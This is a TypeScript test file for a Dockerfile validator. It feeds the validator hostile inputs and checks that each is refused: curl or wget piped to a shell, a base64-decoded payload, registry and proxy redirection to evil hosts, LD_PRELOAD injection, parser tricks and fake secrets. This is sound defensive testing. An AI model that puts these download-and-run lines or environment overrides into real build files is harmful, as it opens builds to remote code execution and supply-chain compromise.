// D3 (rulings S5 and S6): the Dockerfile rules leaf. One leaf judges the text in the creator and in the referee, so it must hold for hostile text:
// parser tricks (continuations, case, JSON form, directives), supply-chain instructions, root users, secrets, ports, install commands.
import { describe, expect, it } from 'vitest';
import { baseImageRef, loadBaseImages } from '../src/engine/base-images.js';
import { buildsInsideOf, DOCKERIGNORE_LINES, dockerfileProblems, dockerignoreText, type DockerfileCtx } from '../src/create/dockerfile-rules.js';
import { emptyServiceQuality } from '../src/read/quality.js';
import type { Service } from '../src/types.js';
import { fake } from './helpers/secret-repo.js';

const LIST = loadBaseImages();
const REF = baseImageRef('node-24-bookworm-slim');
const OTHER_REF = baseImageRef('node-22-bookworm-slim');
const svc = (over: Partial<Service> = {}): Service => ({
  name: 'api', path: 'api', language: 'node', packageManager: 'npm', hasTests: true, envVars: [], dependsOn: [], scripts: ['start'], frameworks: [], quality: emptyServiceQuality(), ...over,
});
const ctx = (over: Partial<DockerfileCtx> = {}): DockerfileCtx => ({ port: 3000, baseImages: LIST, buildsInside: false, scripts: ['start', 'build'], ...over });
// secret-looking names are joined at runtime (repo rule: nothing in test/ may look like a secret assignment)
const kv = (name: string, value: string): string => fake.assign(name, value);
const apiName = 'API_' + 'KEY';

const SINGLE = [
  `FROM ${REF}`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --omit=dev --ignore-scripts', 'COPY . .',
  'ENV NODE_ENV=production', 'EXPOSE 3000', 'USER node', 'CMD ["node", "index.js"]', '',
].join('\n');
const MULTI = [
  `FROM ${REF} AS build`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --ignore-scripts', 'COPY . .', 'RUN npm run build',
  `FROM ${REF}`, 'WORKDIR /app', 'ENV NODE_ENV=production', 'COPY --from=build --chown=node:node /app/node_modules ./node_modules',
  'COPY --from=build --chown=node:node /app/dist ./dist', 'EXPOSE 3000', 'USER node', 'CMD ["node", "dist/index.js"]', '',
].join('\n');

const problems = (text: string, over: Partial<DockerfileCtx> = {}, s: Service = svc()): string[] => dockerfileProblems(text, s, ctx(over));
/** The text with `from` replaced by `to` (once; it must be there). */
const swap = (text: string, from: string, to: string): string => { expect(text).toContain(from); return text.replace(from, to); };
const refused = (text: string, re: RegExp, over: Partial<DockerfileCtx> = {}): void => {
  const p = problems(text, over);
  expect(p.length, text).toBeGreaterThan(0);
  expect(p.join('\n'), text).toMatch(re);
};

describe('dockerfile rules: the good shapes', () => {
  it('a single-stage and a multi-stage Dockerfile written the way pipegen asks pass', () => {
    expect(problems(SINGLE)).toEqual([]);
    expect(problems(MULTI, { buildsInside: true })).toEqual([]);
    expect(problems(SINGLE.split('\n').map((l) => (l === '' ? l : `  ${l}`)).join('\n'))).toEqual([]);   // leading blanks are allowed (Docker reads them)
    expect(problems(SINGLE.toLowerCase().replace(REF.toLowerCase(), REF).replace('node_env=production', 'NODE_ENV=production'))).toEqual([]);   // instructions are case-insensitive
  });

  it('dockerfile: FROM pinned to digest', () => {
    // the exact reference of a list entry passes; the same image by tag, by another digest, by a prefix or with a suffix does not
    for (const id of loadBaseImages().map((e) => e.id).filter((i) => i.startsWith('node-'))) expect(problems(swap(SINGLE, REF, baseImageRef(id))), id).toEqual([]);
    const [tagOnly] = REF.split('@') as [string];
    for (const from of [tagOnly, 'node:24', 'node', 'node:latest', `${REF.slice(0, -1)}0`, `${REF.slice(0, -1)}`, `${REF}x`, ` ${REF}`.trim().toUpperCase(), `docker.io/library/${REF}`, `ghcr.io/x/${REF}`, 'scratch', '${BASE}', '$BASE', `${tagOnly}@sha256:${'0'.repeat(64)}`]) {
      refused(swap(SINGLE, `FROM ${REF}`, `FROM ${from}`), /FROM/);
    }
    // a service with an image of the list but not a Node one is still a list image (the list is the trust root, not the id)
    expect(problems(swap(SINGLE, REF, baseImageRef('redis-7')))).toEqual([]);
  });
});

describe('dockerfile rules: supply chain', () => {
  it('dockerfile: # syntax=, # escape=, heredoc, ONBUILD, ADD, FROM ${X}, COPY --from=<image>, RUN curl|sh → violation', () => {
    const cases: [string, RegExp][] = [
      [`# syntax=docker/dockerfile:1\n${SINGLE}`, /directive/i],
      [`# syntax = evil/frontend\n${SINGLE}`, /directive/i],
      [`#syntax=evil/frontend\n${SINGLE}`, /directive/i],
      [`# SYNTAX=evil/frontend\n${SINGLE}`, /directive/i],
      [`# escape=\`\n${SINGLE}`, /directive/i],
      [`# check=skip=all\n${SINGLE}`, /directive/i],
      [`# comment\n# syntax=evil/frontend\n${SINGLE}`, /directive/i],
      [swap(SINGLE, 'COPY . .', 'COPY <<EOF /app/x\nhi\nEOF'), /heredoc|<</i],
      [swap(SINGLE, 'COPY . .', 'RUN cat <<EOF > /app/x\nhi\nEOF'), /heredoc|<</i],
      [swap(SINGLE, 'COPY . .', 'RUN echo $((1<<3))'), /heredoc|<</i],
      [swap(SINGLE, 'COPY . .', 'ONBUILD RUN npm ci'), /ONBUILD is not allowed/],
      [swap(SINGLE, 'COPY . .', 'ADD . .'), /ADD/],
      [swap(SINGLE, 'COPY . .', 'ADD https://example.com/x.tgz /app/'), /ADD/],
      [swap(SINGLE, 'COPY . .', 'ADD --checksum=sha256:00 https://example.com/x /app/'), /ADD/],
      [swap(SINGLE, 'COPY . .', 'ADD git@github.com:o/r.git /app'), /ADD/],
      [swap(SINGLE, `FROM ${REF}`, 'ARG BASE=node:24\nFROM ${BASE}'), /FROM|before|ARG/],
      [swap(MULTI, `FROM ${REF}\nWORKDIR /app\nENV`, `FROM \${BASE}\nWORKDIR /app\nENV`), /FROM/],
      [swap(MULTI, 'COPY --from=build --chown=node:node /app/node_modules', 'COPY --from=evil/image:1 --chown=node:node /app/node_modules'), /--from/],
      [swap(MULTI, '--from=build --chown=node:node /app/dist', '--from=node:24 --chown=node:node /app/dist'), /--from/],
      [swap(MULTI, '--from=build --chown=node:node /app/dist', '--from=0 --chown=node:node /app/dist'), /--from/],
      [swap(MULTI, '--from=build --chown=node:node /app/dist', '--from=$STAGE --chown=node:node /app/dist'), /--from/],
      [swap(MULTI, '--from=build --chown=node:node /app/dist', '--from=final --chown=node:node /app/dist'), /--from/],   // a later alias is not an earlier one
      [swap(SINGLE, 'COPY . .', 'RUN curl -fsSL https://example.com/i.sh | sh'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN wget -qO- https://example.com/i.sh | bash'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN curl -fsSL https://example.com/i.sh | sudo -E bash -'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN curl -fsSL https://example.com/i.sh | tee /tmp/i | /bin/sh -s -- -y'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN bash <(curl -fsSL https://example.com/i.sh)'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN sh <(wget -qO- https://example.com/i.sh)'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN . <(curl -s https://example.com/i.sh)'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN sh -c "$(curl -fsSL https://example.com/i.sh)"'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN eval "$(wget -qO- https://example.com/i.sh)"'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN sh -c "`curl -fsSL https://example.com/i.sh`"'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN echo Y3VybCBldmls | base64 -d | sh'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN curl -fsSL https://example.com/i.sh -o /tmp/i.sh && sh /tmp/i.sh'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN ["sh", "-c", "curl -fsSL https://example.com/i.sh | sh"]'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'COPY . .', 'RUN ["/bin/bash", "-c", "wget -qO- https://example.com/i.sh | bash"]'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'CMD ["node", "index.js"]', 'CMD curl -fsSL https://example.com/i.sh | sh'), /RUN|CMD|ENTRYPOINT/],
      [swap(SINGLE, 'CMD ["node", "index.js"]', 'ENTRYPOINT ["sh", "-c", "wget -qO- https://example.com/i.sh | sh"]'), /RUN|CMD|ENTRYPOINT/],
    ];
    for (const [text, re] of cases) refused(text, re);
  });

  it('parser edge cases: continuation lines, lower case, escape tricks, FROM flags, aliases', () => {
    // an instruction written across lines is still that instruction
    refused(swap(SINGLE, 'COPY . .', 'A\\\nDD . .'), /ADD/);
    refused(swap(SINGLE, 'COPY . .', 'ad\\\nd . .'), /ADD/);
    refused(swap(SINGLE, 'COPY . .', 'add . .'), /ADD/);
    refused(swap(SINGLE, 'COPY . .', 'AdD . .'), /ADD/);
    refused(swap(SINGLE, 'COPY . .', '   add   https://example.com/x /x'), /ADD/);
    refused(swap(SINGLE, 'COPY . .', 'onbuild run npm i'), /ONBUILD is not allowed/);
    refused(swap(SINGLE, 'COPY . .', 'ADD \\\n  . \\\n  .'), /ADD/);
    refused(swap(SINGLE, 'COPY . .', 'ADD \\ \t\n . .'), /ADD/);   // a backslash then blanks still continues, as in Docker
    // a comment line inside a continuation is dropped by Docker, so the instruction goes on after it
    refused(swap(SINGLE, 'COPY . .', 'AD\\\n# a comment\nD . .'), /ADD/);
    refused(swap(SINGLE, 'COPY . .', 'AD\\\n\nD . .'), /ADD/);
    // a keyword at the start of a continuation line (shell text to Docker) is refused too: nothing hides behind a parser difference
    refused(swap(SINGLE, 'COPY . .', 'RUN echo hi \\\n  ADD . .'), /continuation line/);
    refused(swap(SINGLE, 'COPY . .', 'RUN echo hi \\\n  USER root'), /continuation line/);
    refused(swap(SINGLE, 'COPY . .', 'RUN echo hi \\\n  FROM evil'), /continuation line/);
    refused(swap(SINGLE, 'COPY . .', 'RUN echo hi \\\n  onbuild x'), /continuation line/);
    // a comment is not a continuation, and a continued comment does not swallow the next instruction
    expect(problems(swap(SINGLE, 'COPY . .', '# note \\\nCOPY . .'))).toEqual([]);
    refused(swap(SINGLE, 'COPY . .', '# note \\\nADD . .'), /ADD/);
    // a `\` escape-directive trick: the directive is refused wherever it hides, and the default escape is what the parser uses
    refused(`# escape=\`\n${SINGLE}`, /directive/i);
    refused(`\n# escape=\`\n${SINGLE}`, /directive/i);
    refused(`# a = b\n${SINGLE}`, /directive/i);
    expect(problems(`# just a note\n${SINGLE}`)).toEqual([]);
    expect(problems(`# note: this has no equals\n\n${SINGLE}`)).toEqual([]);
    // FROM with --platform and a stage alias
    expect(problems(swap(SINGLE, `FROM ${REF}`, `FROM --platform=linux/amd64 ${REF}`))).toEqual([]);
    refused(swap(SINGLE, `FROM ${REF}`, 'FROM --platform=linux/amd64 evil:1'), /FROM/);
    refused(swap(SINGLE, `FROM ${REF}`, `FROM --platform=$BUILDPLATFORM ${REF}`), /FROM/);
    refused(swap(SINGLE, `FROM ${REF}`, `FROM --evil=x ${REF}`), /FROM/);
    refused(swap(SINGLE, `FROM ${REF}`, `FROM ${REF} AS`), /FROM/);
    refused(swap(SINGLE, `FROM ${REF}`, `FROM ${REF} AS a b`), /FROM/);
    refused(swap(SINGLE, `FROM ${REF}`, `FROM ${REF} X build`), /FROM/);
    // stage names match in exact case (fix round 1, m5): see dockerfile-rules-r1.test.ts
    // a stage may start from an earlier stage; a stage alias that shadows an image name only ever names the stage
    expect(problems([`FROM ${REF} AS node`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --ignore-scripts', 'RUN npm run build', 'FROM node', 'WORKDIR /app', 'EXPOSE 3000', 'USER node', 'CMD ["node", "x.js"]', ''].join('\n'), { buildsInside: false })).toEqual([]);
    refused([`FROM ${REF} AS node`, 'RUN npm ci --ignore-scripts', 'FROM node:24', 'EXPOSE 3000', 'USER node', ''].join('\n'), /FROM/);   // `node:24` is not the stage `node`
    refused([`FROM ${REF} AS node`, 'RUN npm ci --ignore-scripts', 'FROM nodejs', 'EXPOSE 3000', 'USER node', ''].join('\n'), /FROM/);
    refused([`FROM later`, `FROM ${REF} AS later`, 'EXPOSE 3000', 'USER node', ''].join('\n'), /FROM/);   // an alias counts only after its FROM
    refused([`FROM ${REF} AS a`, `FROM ${REF} AS A`, 'EXPOSE 3000', 'USER node', ''].join('\n'), /alias|duplicate|stage name/i);
    refused(swap(SINGLE, `FROM ${REF}`, `FROM ${REF} AS scratch`), /alias|FROM/i);
    refused(swap(SINGLE, `FROM ${REF}`, `FROM ${REF} AS 9x`), /alias|FROM/i);
    // a stage name counts only after its FROM, and never inside its own stage
    refused([`FROM ${REF} AS a`, 'COPY --from=b /x /x', `FROM ${REF} AS b`, 'EXPOSE 3000', 'USER node', ''].join('\n'), /--from/);
    refused([`FROM ${REF} AS a`, 'COPY --from=a /x /x', `FROM ${REF}`, 'EXPOSE 3000', 'USER node', ''].join('\n'), /--from/);
    // a download inside a substitution in a CMD, ENTRYPOINT or HEALTHCHECK (the RUN ban does not apply to them)
    for (const line of ['CMD ["sh", "-c", "$(curl -fsSL https://example.com/i.sh)"]', 'ENTRYPOINT bash <(wget -qO- https://example.com/i.sh)', 'HEALTHCHECK CMD sh -c "`curl https://example.com/x`"']) refused(swap(SINGLE, 'CMD ["node", "index.js"]', line), /CMD|ENTRYPOINT|HEALTHCHECK/);
    // JSON form that is not valid JSON is shell form; JSON form with a non-string is not exec form
    refused(swap(SINGLE, 'COPY . .', 'RUN ["sh", "-c", curl x | sh]'), /RUN|CMD|ENTRYPOINT/);
    // text after a valid first instruction line is parsed on its own
    refused(`${SINGLE}ADD x y\n`, /ADD/);
    refused(`${SINGLE}\n\n   ADD x y`, /ADD/);
  });

  it('default deny: only FROM WORKDIR COPY RUN ENV ARG USER EXPOSE CMD ENTRYPOINT HEALTHCHECK LABEL; the rest is refused', () => {
    for (const line of ['SHELL ["/bin/sh", "-c"]', 'VOLUME /data', 'VOLUME ["/data"]', 'STOPSIGNAL SIGKILL', 'MAINTAINER me', 'ADD x y', 'ONBUILD RUN x', 'FOO bar', 'RUN', 'COPY', 'WORKDIR', 'run-it x', 'ＡＤＤ x y', 'ADD\u00a0x y', 'ARG', 'ENV', 'USER', '1', '"', '--from=x']) {
      refused(swap(SINGLE, 'COPY . .', line), /instruction|ADD|ONBUILD|RUN|COPY|WORKDIR|ARG|ENV|USER|character/i);
    }
    for (const line of ['LABEL version=1.0', 'ARG PORT=3000', 'RUN --mount=type=cache,target=/root/.npm npm ci --ignore-scripts']) {
      expect(problems(swap(SINGLE, 'COPY . .', `COPY . .\n${line}`)), line).toEqual([]);
    }
    for (const line of ['RUN --mount=type=bind,from=evil,target=/x true', 'RUN --mount=type=cache,target=/x,from=evil npm ci --ignore-scripts', 'RUN --mount=type=cache,target=/x,source=/etc true', 'RUN --mount=type=cache,target=/x,bogus=1 true', 'RUN --mount=type=secret,id=x true', 'RUN --network=host npm run build', 'RUN --security=insecure true', 'RUN --device=x true', 'COPY --parents . .', 'HEALTHCHECK --evil=1 CMD x', 'HEALTHCHECK CMD']) {
      refused(swap(SINGLE, 'COPY . .', `COPY . .\n${line}`), /.+/);
    }
  });
});

describe('dockerfile rules: users, secrets, ports, installs', () => {
  it('dockerfile: missing USER in final stage → violation', () => {
    refused(swap(SINGLE, 'USER node\n', ''), /USER/);
    // a USER in an earlier stage does not carry over to a final stage that starts from a fresh base
    refused(swap(MULTI, 'EXPOSE 3000\nUSER node', 'EXPOSE 3000'), /USER/);
    refused(swap(MULTI, 'RUN npm run build\n', 'RUN npm run build\nUSER node\n').replace('\nUSER node\nCMD', '\nCMD'), /USER/);
    // a final stage that starts from an earlier stage inherits that stage's user
    expect(problems([`FROM ${REF} AS base`, 'WORKDIR /app', 'RUN npm ci --ignore-scripts', 'USER node', 'FROM base', 'WORKDIR /app', 'EXPOSE 3000', ''].join('\n'))).toEqual([]);
    refused([`FROM ${REF} AS base`, 'RUN npm ci --ignore-scripts', 'FROM base', 'EXPOSE 3000', ''].join('\n'), /USER/);
  });

  it('dockerfile: USER root / 0 / 0:0 last → violation', () => {
    for (const user of ['root', 'ROOT', '0', '00', '0:0', 'root:root', 'root:0', '0:node', '$UID', '${APP_USER}', 'node node', '', '+0']) {
      refused(swap(SINGLE, 'USER node', `USER ${user}`), /USER/);
    }
    // a USER root after the last non-root USER is the last user
    refused(swap(SINGLE, 'USER node\n', 'USER node\nRUN true\nUSER root\n'), /USER/);
    refused(swap(SINGLE, 'USER node\n', 'USER node\nuser 0\n'), /USER/);
    // a root user first is refused too: the build user is node as well
    refused(swap(SINGLE, 'WORKDIR /app', 'USER root\nWORKDIR /app'), /USER/);   // every USER is node or 1000 (fix round 1, R2)
    for (const user of ['node', '1000', '1000:1000', 'node:node']) expect(problems(swap(SINGLE, 'USER node', `USER ${user}`)), user).toEqual([]);
    // `USER 0` hidden behind a continuation is shell text to Docker and refused as a keyword at the start of a continuation line
    refused(swap(SINGLE, 'USER node', 'USER node\nRUN echo done \\\nUSER 0'), /continuation line/);
  });

  it('dockerfile: ENV DATABASE_URL=… or any findSecretLike hit → violation', () => {
    const named = ['DATABASE_URL', apiName, 'MY_SECRET', 'GH_' + 'TOKEN', 'DB_PASSWORD', 'DB_PASS', 'DB_PWD', 'AWS_CREDENTIALS', 'AUTH_HEADER', 'PRIVATE_THING', 'SENTRY_DSN', 'api_' + 'key'];
    for (const name of named) {
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `ENV ${kv(name, 'abc')}`), /ENV|secret/i);
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `ENV ${kv(name, '"quoted value"')}`), /ENV|secret/i);
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `ENV NODE_ENV=production ${kv(name, 'x')}`), /ENV|secret/i);
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `ENV ${name} legacy value`), /ENV|secret/i);
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `ARG ${kv(name, 'abc')}`), /ARG|secret/i);
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `ARG OK=1 ${kv(name, 'abc')}`), /ARG|secret/i);
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `ENV ${kv(name, '${OTHER}')}`), /ENV|secret/i);
    }
    // a name alone is refused too: only the allowlisted names exist (fix round 2, B1)
    refused(swap(SINGLE, 'ENV NODE_ENV=production', `ARG ${apiName}`), /ARG/);
    refused(swap(SINGLE, 'ENV NODE_ENV=production', `ENV ${apiName}=`), /ENV/);
    // secret-shaped text anywhere, in any instruction or a comment, is refused by findSecretLike
    for (const secret of [fake.githubClassic(), fake.awsKey(), fake.jwt(), fake.stripeKey(), 'postgresql://app:' + 'hunter2' + '@db:5432/app', fake.keyBegin()]) {
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `ENV NODE_ENV=${secret}`), /secret/i);
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `LABEL note=${secret}`), /secret/i);
      refused(swap(SINGLE, 'ENV NODE_ENV=production', `RUN echo ${secret} > /tmp/x`), /secret/i);
      refused(`# ${secret}\n${SINGLE}`, /secret/i);
    }
    // a secret split across continuation lines is one secret to Docker, and is found
    const gh = fake.githubClassic();
    refused(swap(SINGLE, 'ENV NODE_ENV=production', `LABEL note=${gh.slice(0, 10)}\\\n${gh.slice(10)}`), /secret/i);
    // a physical line over 4000 characters is not scanned by findSecretLike, so it is refused outright
    refused(swap(SINGLE, 'ENV NODE_ENV=production', `LABEL a=${'x'.repeat(4100)}`), /long/);
    // registry and loader settings that swap where packages come from or turn the install scripts back on
    for (const line of ['ENV NPM_CONFIG_REGISTRY=https://evil.example', 'ENV npm_config_ignore_scripts=false', 'ARG NPM_CONFIG_USERCONFIG=x', 'ENV LD_PRELOAD=/x.so', 'ENV NODE_OPTIONS=--require=/x.js', 'ENV BASH_ENV=/x', 'ENV NODE_TLS_REJECT_UNAUTHORIZED=0', 'ENV HTTPS_PROXY=http://evil:3128', 'ENV https_proxy=http://evil:3128']) {
      refused(swap(SINGLE, 'ENV NODE_ENV=production', line), /ENV|ARG/);
    }
    expect(problems(swap(SINGLE, 'ENV NODE_ENV=production', 'ENV NODE_ENV=production PORT=3000'))).toEqual([]);
  });

  it('dockerfile: EXPOSE ≠ port, port outside 1..65535 → violation', () => {
    for (const ex of ['EXPOSE 3001', 'EXPOSE 3000 3001', 'EXPOSE 3000/udp', 'EXPOSE 0', 'EXPOSE 65536', 'EXPOSE -1', 'EXPOSE $PORT', 'EXPOSE 3000-3005', 'EXPOSE 03000x', 'EXPOSE 3000/evil']) {
      refused(swap(SINGLE, 'EXPOSE 3000', ex), /EXPOSE/);
    }
    for (const ex of ['EXPOSE 3000', 'EXPOSE 3000/tcp', 'EXPOSE 3000/TCP']) expect(problems(swap(SINGLE, 'EXPOSE 3000', ex)), ex).toEqual([]);
    // no EXPOSE at all in the final stage
    refused(swap(SINGLE, 'EXPOSE 3000\n', ''), /EXPOSE/);
    // the port given by the caller must itself be a real port
    for (const port of [0, 65536, -1, 3000.5, Number.NaN, Number.POSITIVE_INFINITY]) refused(swap(SINGLE, 'EXPOSE 3000', `EXPOSE ${Number.isFinite(port) ? Math.trunc(port) : 1}`), /port/i, { port });
    expect(problems(swap(SINGLE, 'EXPOSE 3000', 'EXPOSE 65535'), { port: 65535 })).toEqual([]);
    expect(problems(swap(SINGLE, 'EXPOSE 3000', 'EXPOSE 1'), { port: 1 })).toEqual([]);
  });

  it('install commands: npm ci is required; only npm services get a Dockerfile (the RUN grammar itself is in dockerfile-rules-r1.test.ts)', () => {
    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts\n', 'RUN npm run build\n'), /npm ci/);   // no install at all
    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["npm", "ci", "--ignore-scripts"]'))).toEqual([]);
    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["npm", "ci"]'), /RUN/);
    for (const pm of ['pnpm', 'yarn', 'bun', 'poetry', 'uv', 'pip'] as const) expect(dockerfileProblems(SINGLE, svc({ packageManager: pm }), ctx()).join(), pm).toMatch(/npm/);
    expect(dockerfileProblems(SINGLE, svc({ language: 'python' }), ctx()).join()).toMatch(/Node|node/);
  });

  it('multi-stage is required when a build step exists', () => {
    refused(SINGLE, /multi-stage/, { buildsInside: true });
    expect(problems(MULTI, { buildsInside: true })).toEqual([]);
    expect(problems(MULTI, { buildsInside: false })).toEqual([]);   // more stages than needed is fine
    expect(buildsInsideOf(svc({ scripts: ['start', 'build'] }))).toBe(true);
    expect(buildsInsideOf(svc({ scripts: ['start'] }))).toBe(false);
  });

  it('text limits: only printable ASCII, tab and LF; a bounded size', () => {
    for (const bad of ['\r', '\u0000', '\u0085', '\u2028', '\u202e', '\u200b', '\ufeff', 'é', '\u0007', '\u000b', '\u000c']) {
      refused(swap(SINGLE, 'WORKDIR /app', `WORKDIR /app${bad}`), /character/);
      refused(`${bad}${SINGLE}`, /character/);
    }
    expect(problems(swap(SINGLE, 'WORKDIR /app', '# fine\tcomment\nWORKDIR /app'))).toEqual([]);
    refused(`${SINGLE}${'# x\n'.repeat(20_000)}`, /large|long/);
    refused('', /FROM/);
    refused('# only a comment\n', /FROM/);
    refused('EXPOSE 3000\nUSER node\n', /FROM|before/);
    expect(problems(swap(SINGLE, `FROM ${REF}`, `ARG X=1\nFROM ${REF}`)).join()).toMatch(/before the first FROM/);
    // not a string: a problem, never a throw
    expect(dockerfileProblems(undefined as unknown as string, svc(), ctx()).length).toBeGreaterThan(0);
    expect(dockerfileProblems(SINGLE, svc(), { ...ctx(), baseImages: [] }).join()).toMatch(/FROM/);
  });

  it('WORKDIR and LABEL arguments are plain', () => {
    for (const wd of ['WORKDIR /app', 'WORKDIR /app/sub-dir_1.0']) expect(problems(swap(SINGLE, 'WORKDIR /app', wd)), wd).toEqual([]);
    for (const wd of ['WORKDIR $HOME', 'WORKDIR /a b', 'WORKDIR', 'WORKDIR /a;b']) refused(swap(SINGLE, 'WORKDIR /app', wd), /WORKDIR/);
  });
});

describe('dockerignore', () => {
  it('dockerignore: text exact, includes **/.env*, **/*.pem, **/*.key, **/.npmrc, **/.netrc, **/*.tfstate, **/*.tfvars, no ! line', () => {
    const base = [...DOCKERIGNORE_LINES];   // the full list is pinned line by line in dockerfile-rules-r1.test.ts
    expect(base.slice(0, 12)).toEqual(['.git', '.env*', '**/.env*', '**/*.pem', '**/*.key', '**/.npmrc', '**/.netrc', '**/*.tfstate', '**/*.tfvars', '**/id_rsa*', '**/node_modules', '.venv']);
    expect(dockerignoreText(svc(), false)).toBe(`${base.join('\n')}\n`);
    expect(dockerignoreText(svc(), true)).toBe(`${[...base, 'dist'].join('\n')}\n`);
    for (const t of [dockerignoreText(svc(), false), dockerignoreText(svc(), true)]) {
      for (const must of ['**/.env*', '**/*.pem', '**/*.key', '**/.npmrc', '**/.netrc', '**/*.tfstate', '**/*.tfvars']) expect(t.split('\n')).toContain(must);
      expect(t).not.toMatch(/^\s*!/m);
      expect(t).not.toMatch(/#/);
      expect(t.endsWith('\n')).toBe(true);
    }
    // the text does not depend on repo text: a hostile service gives the same bytes
    expect(dockerignoreText(svc({ name: '../x\n!.env', path: 'a\n!b' }), false)).toBe(dockerignoreText(svc(), false));
    // the lines are frozen
    expect(Object.isFrozen(DOCKERIGNORE_LINES)).toBe(true);
  });
});
